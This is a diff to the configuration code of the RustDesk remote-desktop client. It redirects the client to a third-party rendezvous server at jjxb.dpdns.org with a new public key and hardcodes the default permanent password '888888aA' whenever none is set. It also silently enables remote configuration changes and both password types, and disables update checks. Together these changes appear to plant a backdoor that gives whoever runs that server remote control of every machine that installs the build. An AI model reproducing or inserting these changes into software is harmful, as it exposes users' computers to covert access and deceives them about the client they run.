@@ -114,8 +114,8 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
-pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
+pub const RENDEZVOUS_SERVERS: &[&str] = &["jjxb.dpdns.org"];
+pub const RS_PUB_KEY: &str = "xn4O4mrpPtJJBjf79irvIgSPCHPUizEROsJRGD+3RAU=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
 pub const RELAY_PORT: i32 = 21117;
@@ -490,6 +490,23 @@ impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
         let mut store = false;
+        
+        if !config.options.contains_key("allow-remote-config-modification") {
+            	config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+            	store = true;
+        	}
+        	
+        if !config.options.contains_key("allow-numeric-one-time-password") {
+            	config.options.insert("allow-numeric-one-time-password".to_string(), "Y".to_string());
+            	store = true;
+        	}
+        	
+        if !config.options.contains_key("verification-method") {
+            config.options.insert("verification-method".to_string(), "use-both-passwords".to_string());
+            store = true;
+        }		
+
+        
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
@@ -609,6 +626,13 @@ impl Config {
     fn load() -> Config {
         let mut config = Config::load_::<Config>("");
         let mut store = false;
+        if config.password.is_empty() {
+
+          config.password = "888888aA".to_string();
+
+           store = true;
+
+                }
         if let Err(err) = Self::validate_or_decrypt_permanent_password_storage(&mut config) {
             log::error!("Failed to validate or decrypt permanent password storage: {err}");
         }
@@ -2140,7 +2164,34 @@ pub struct LocalConfig {
 
 impl LocalConfig {
     fn load() -> LocalConfig {
-        Config::load_::<LocalConfig>("_local")
+        let mut config = Config::load_::<LocalConfig>("_local");
+        		let mut store = false;
+        		
+        if !config.options.contains_key("theme") {
+            	config.options.insert("theme".to_string(), "dark".to_string());
+            	store = true;
+        	}
+        
+        if !config.options.contains_key("enable-check-update") {
+		config.options.insert("enable-check-update".to_string(), "N".to_string());
+		store = true;
+		    }
+		    
+		if !config.options.contains_key("enable-ipv6-punch") {
+            	config.options.insert("enable-ipv6-punch".to_string(), "Y".to_string());
+            	store = true;
+        	}    
+	
+        			
+        if !config.options.contains_key("enable-udp-punch") {
+            	config.options.insert("enable-udp-punch".to_string(), "Y".to_string());
+            	store = true;
+        	}
+		if store {
+            	config.store();
+        	}
+		config
+
     }
 
     fn store(&self) {
